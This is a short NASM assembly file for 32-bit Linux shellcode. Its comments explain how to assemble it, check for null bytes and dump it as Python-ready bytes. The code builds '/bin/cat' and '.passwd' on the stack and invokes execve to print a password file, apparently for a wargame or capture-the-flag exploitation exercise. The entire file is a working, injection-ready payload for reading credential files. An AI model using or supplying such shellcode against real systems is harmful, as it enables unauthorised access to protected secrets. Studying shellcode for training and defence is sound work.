;  nasm -f elf -o out.o readpw.s
; first check for nulls:
;  objdump -d out.o
; if you want to run:
;  ld -m elf_i386 -o out out.o
; or dump shellcode:
;  objcopy --output-target=binary --only-section=.text out.o shell.bin
; print shellcode as python bytes:
;  python -c "print(repr(open('shell.bin', 'rb').read())[2:-1])"

section .data
; crickets

section .text
global _start
_start:

push 0x0b
pop eax ; execve
xor edx, edx ; ptr to env = NULL

; data
mov ebx, 0x647773AA
shr ebx, 0x8
push ebx ; swd\0
push 0x7361702e ; .pas
; save esp (to build array later)
mov ecx, esp

push edx ; NULL
push 0x7461632f ; /cat
push 0x6e69622f ; /bin

mov ebx, esp ; -> "/bin/cat\0"

; make array of data
push edx ; NULL
push ecx ; -> ".passwd\0"
push ebx ; -> "/bin/cat\0"

mov ecx, esp ; ptr to array of data

int 0x80 ; syscall
